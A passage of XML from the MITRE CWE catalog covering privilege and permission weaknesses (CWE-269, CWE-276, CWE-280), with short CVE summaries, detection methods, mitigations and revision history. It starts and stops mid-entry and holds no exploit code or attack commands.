               <Description>Terminal privileges are not reset when a user logs out.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1555</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-1514</Reference>
               <Description>Does not properly pass security context to child processes in certain cases, allows privilege escalation.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-1514</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2001-0128</Reference>
               <Description>Does not properly compute roles.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0128</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-1999-1193</Reference>
               <Description>untrusted user placed in unix "wheel" group</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-1999-1193</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2741</Reference>
               <Description>Product allows users to grant themselves certain rights that can be used to escalate privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2741</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2496</Reference>
               <Description>Product uses group ID of a user instead of the group, causing it to run with different privileges. This is resultant from some other unknown issue.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2496</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0274</Reference>
               <Description>Product mistakenly assigns a particular status to an entity, leading to increased privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0274</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4217</Reference>
               <Description>FTP client program on a certain OS runs with setuid privileges and has a buffer overflow. Most clients do not need extra privileges, so an overflow is not a vulnerability for those clients.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4217</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5159</Reference>
               <Description>OS incorrectly installs a program with setuid privileges, allowing users to gain privileges.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5159</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4638</Reference>
               <Description>Composite: application running with high privileges (CWE-250) allows user to specify a restricted file to process, which generates a parsing error that leaks the contents of the file (CWE-209).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4638</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3931</Reference>
               <Description>Installation script installs some programs as setuid when they shouldn't be.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3931</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1981</Reference>
               <Description>Roles have access to dangerous procedures (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1981</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-1671</Reference>
               <Description>Untrusted object/method gets access to clipboard (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-1671</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0315</Reference>
               <Description>Traceroute program allows unprivileged users to modify source address of packet (Accessible entities).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0315</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0506</Reference>
               <Description>User with capability can prevent setuid program from dropping privileges (Unsafe privileged actions).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0506</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Privilege Management Error</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="122"/>
            <Related_Attack_Pattern CAPEC_ID="233"/>
            <Related_Attack_Pattern CAPEC_ID="58"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 16: Executing Code With Too Much Privilege.&#34; Page 243"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 9, &#34;Dropping Privileges Permanently&#34;, Page 479"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Notes>
            <Note Type="Mapping">
               <xhtml:p>Use for Mapping: Discouraged (this CWE ID should not be used to map to real-world vulnerabilities).</xhtml:p>
               <xhtml:p>Rationale: CWE-269 is commonly misused. It can be conflated with "privilege escalation," which is a technical impact that is listed in many low-information vulnerability reports [REF-1287]. It is not useful for trend analysis.</xhtml:p>
               <xhtml:p>Comments: if an error or mistake allows privilege escalation, then use the CWE ID for that mistake. Avoid using CWE-269 when only phrases such as "privilege escalation" or "gain privileges" are available, as these indicate technical impact of the vulnerability - not the root cause weakness. If the root cause seems to be directly related to privileges, then examine the children of CWE-269 for additional hints, such as Execution with Unnecessary Privileges (CWE-250) or Incorrect Privilege Assignment (CWE-266).</xhtml:p>
            </Note>
            <Note Type="Maintenance">The relationships between privileges, permissions, and actors (e.g. users and groups) need further refinement within the Research view. One complication is that these concepts apply to two different pillars, related to control of resources (CWE-664) and protection mechanism failures (CWE-693).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>CWE Team</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>Moved this entry higher up in the Research view.</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Maintenance_Notes, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Type</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Maintenance_Notes, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Privilege Management Error</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Insecure Privilege Management</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="276" Name="Incorrect Default Permissions" Abstraction="Base" Structure="Simple" Status="Draft">
     <Description>During installation, installed file permissions are set to allow anyone to modify those files.</Description>
     <Related_Weaknesses>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1000" Ordinal="Primary"/>
      <Related_Weakness Nature="ChildOf" CWE_ID="732" View_ID="1003" Ordinal="Primary"/>
     </Related_Weaknesses>
     <Weakness_Ordinalities>
      <Weakness_Ordinality>
        <Ordinality>Primary</Ordinality>
      </Weakness_Ordinality>
     </Weakness_Ordinalities>
     <Applicable_Platforms>
      <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
      <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	  <Technology Class="ICS/OT" Prevalence="Undetermined"/>
     </Applicable_Platforms>
     <Modes_Of_Introduction>
      <Introduction>
        <Phase>Architecture and Design</Phase>
      </Introduction>
      <Introduction>
        <Phase>Implementation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Installation</Phase>
      </Introduction>
      <Introduction>
        <Phase>Operation</Phase>
      </Introduction>
     </Modes_Of_Introduction>
     <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
     <Common_Consequences>
      <Consequence>
        <Scope>Confidentiality</Scope>
        <Scope>Integrity</Scope>
        <Impact>Read Application Data</Impact>
        <Impact>Modify Application Data</Impact>
      </Consequence>
     </Common_Consequences>
     <Detection_Methods>
      <Detection_Method>
        <Method>Automated Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inter-application Flow Analysis</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Binary or Bytecode</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Automated Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host-based Vulnerability Scanners - Examine configuration for flaws, verifying that audit mechanisms work, ensure host configuration meets certain predefined criteria</xhtml:li>
              <xhtml:li>Web Application Scanner</xhtml:li>
              <xhtml:li>Web Services Scanner</xhtml:li>
              <xhtml:li>Database Scanners</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Dynamic Analysis with Manual Results Interpretation</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Host Application Interface Scanner</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Fuzz Tester</xhtml:li>
              <xhtml:li>Framework-based Fuzzer</xhtml:li>
              <xhtml:li>Automated Monitored Execution</xhtml:li>
              <xhtml:li>Forced Path Execution</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Manual Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis - Source Code</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Automated Static Analysis</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Configuration Checker</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>SOAR Partial</Effectiveness>
      </Detection_Method>
      <Detection_Method>
        <Method>Architecture or Design Review</Method>
        <Description>
         <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
         <xhtml:div style="margin-left:1em;">
           <xhtml:div>Highly cost effective:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
            </xhtml:ul>
           <xhtml:div>Cost effective for partial coverage:</xhtml:div>
            <xhtml:ul>
              <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
            </xhtml:ul>
         </xhtml:div>
        </Description>
        <Effectiveness>High</Effectiveness>
      </Detection_Method>
     </Detection_Methods>
     <Potential_Mitigations>
      <Mitigation Mitigation_ID="MIT-1">
        <Phase>Architecture and Design</Phase>
        <Phase>Operation</Phase>
        <Description>The architecture needs to access and modification attributes for files to only those users who actually require those actions.</Description>
      </Mitigation>
      <Mitigation Mitigation_ID="MIT-46">
        <Phase>Architecture and Design</Phase>
        <Strategy>Separation of Privilege</Strategy>
        <Description>
          <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
          <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
        </Description>
      </Mitigation>
     </Potential_Mitigations>
     <Observed_Examples>
      <Observed_Example>
        <Reference>CVE-2005-1941</Reference>
        <Description>Executables installed world-writable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2005-1941</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1713</Reference>
        <Description>Home directories installed world-readable.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1713</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-1550</Reference>
        <Description>World-writable log files allow information loss; world-readable file has cleartext passwords.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-1550</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1711</Reference>
        <Description>World-readable directory.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1711</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2002-1844</Reference>
        <Description>Windows product uses insecure permissions when installing on Solaris (genesis: port error).</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2002-1844</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-2001-0497</Reference>
        <Description>Insecure permissions for a shared secret key file. Overlaps cryptographic problem.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-2001-0497</Link>
      </Observed_Example>
      <Observed_Example>
        <Reference>CVE-1999-0426</Reference>
        <Description>Default permissions of a device allow IP spoofing.</Description>
        <Link>https://www.cve.org/CVERecord?id=CVE-1999-0426</Link>
      </Observed_Example>
     </Observed_Examples>
     <Taxonomy_Mappings>
      <Taxonomy_Mapping Taxonomy_Name="PLOVER">
        <Entry_Name>Insecure Default Permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
        <Entry_ID>FIO06-C</Entry_ID>
        <Entry_Name>Create files with appropriate access permissions</Entry_Name>
      </Taxonomy_Mapping>
      <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
        <Entry_ID>FIO01-J</Entry_ID>
        <Entry_Name>Create files with appropriate access permission</Entry_Name>
      </Taxonomy_Mapping>
     </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="1"/>
            <Related_Attack_Pattern CAPEC_ID="127"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
         </Related_Attack_Patterns>
         <References>
      <Reference External_Reference_ID="REF-62" Section="Chapter 3, &#34;Insecure Defaults&#34;, Page 69"/>
     </References>
     <Content_History>
      <Submission>
        <Submission_Name>PLOVER</Submission_Name>
        <Submission_Date>2006-07-19</Submission_Date>
      </Submission>
      <Modification>
        <Modification_Name>Eric Dalci</Modification_Name>
        <Modification_Organization>Cigital</Modification_Organization>
        <Modification_Date>2008-07-01</Modification_Date>
        <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-09-08</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2008-11-24</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2009-05-27</Modification_Date>
        <Modification_Comment>updated Description, Name</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-06-01</Modification_Date>
        <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2011-09-13</Modification_Date>
        <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-05-11</Modification_Date>
        <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2012-10-30</Modification_Date>
        <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2014-07-30</Modification_Date>
        <Modification_Comment>updated Detection_Factors, Relationships</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-05-03</Modification_Date>
        <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
      </Modification>
      <Modification>
        <Modification_Name>CWE Content Team</Modification_Name>
        <Modification_Organization>MITRE</Modification_Organization>
        <Modification_Date>2017-11-08</Modification_Date>
        <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
      </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships, Type</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Description, Detection_Factors, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Description, Modes_of_Introduction, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
      <Previous_Entry_Name Date="2009-05-27">Insecure Default Permissions</Previous_Entry_Name>
     </Content_History>
   </Weakness>
      <Weakness ID="280" Name="Improper Handling of Insufficient Permissions or Privileges " Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product does not handle or incorrectly handles when it has insufficient privileges to access resources or functionality as specified by their permissions. This may cause it to follow unexpected code paths that may leave the product in an invalid state.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Impact>Alter Execution Logic</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Always check to see if you have successfully accessed a resource or system functionality, and use proper error handling if it is unsuccessful. Do this even when you are operating in a highly privileged mode, because errors or environmental conditions might still cause a failure. For example, environments with highly granular permissions/privilege models, such as Windows or Linux capabilities, can cause unexpected failures.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2003-0501</Reference>
               <Description>Special file system allows attackers to prevent ownership/permission change of certain entries by opening the entries before calling a setuid program.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0501</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0148</Reference>
               <Description>FTP server places a user in the root directory when the user's permissions prevent access to the their own home directory.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0148</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Fails poorly due to insufficient permissions</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>17</Entry_ID>
               <Entry_Name>Improper Filesystem Permissions</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP4</Entry_ID>
               <Entry_Name>Unchecked Status Condition</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Notes>
            <Note Type="Maintenance">CWE-280 and CWE-274 are too similar. It is likely that CWE-274 will be deprecated in the future.</Note>
            <Note Type="Relationship">This can be both primary and resultant. When primary, it can expose a variety of weaknesses because a resource might not have the expected state, and subsequent operations might fail. It is often resultant from Unchecked Error Condition (CWE-391).</Note>
            <Note Type="Theoretical">Within the context of vulnerability theory, privileges and permissions are two sides of the same coin. Privileges are associated with actors, and permissions are associated with resources. To perform access control, at some point the software makes a decision about whether the actor (and the privileges that have been assigned to that actor) is allowed to access the resource (based on the permissions that have been specified for that resource).</Note>
            <Note Type="Research Gap">This type of issue is under-studied, since researchers often concentrate on whether an object has too many permissions, instead of not enough. These weaknesses are likely to appear in environments with fine-grained models for permissions and privileges, which can include operating systems and other large-scale software packages. However, even highly simplistic permission/privilege models are likely to contain these issues if the developer has not considered the possibility of access failure.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
